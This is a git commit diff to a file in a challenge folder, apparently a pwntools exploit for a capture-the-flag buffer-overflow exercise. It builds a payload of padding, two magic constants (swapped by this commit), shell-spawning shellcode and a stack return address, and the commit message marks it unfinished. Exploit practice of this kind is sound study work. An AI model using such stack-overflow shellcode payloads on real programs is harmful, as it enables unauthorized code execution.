c785bccff115081dfcf2d26b4516707ccec30033
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-18 19:27:09 -0400

    # NOT FINISHED

--- chall_15/15.py
+++ chall_15/15.py
@@ -12,7 +12,7 @@ shellcode = asm(shellcraft.sh())
 
 payload  = b''
 payload += (0x128 - 0xc) * b's'
-payload += p32(0xdeadd00d)
+payload += p32(0xb16b00b5)
 payload += (0x10 - (stack + len(payload)) & 0xf) * b'S'
 
 stack += len(payload)
@@ -20,7 +20,7 @@ log.info('stack: ' + hex(stack))
 
 payload += shellcode
 payload += (0x128 - len(payload) - 0xc) * b'A'
-payload += p32(0xb16b00b5)
+payload += p32(0xdeadd00d)
 payload += (0x128 - len(payload)) * b'a'
 payload += p64(stack)
 
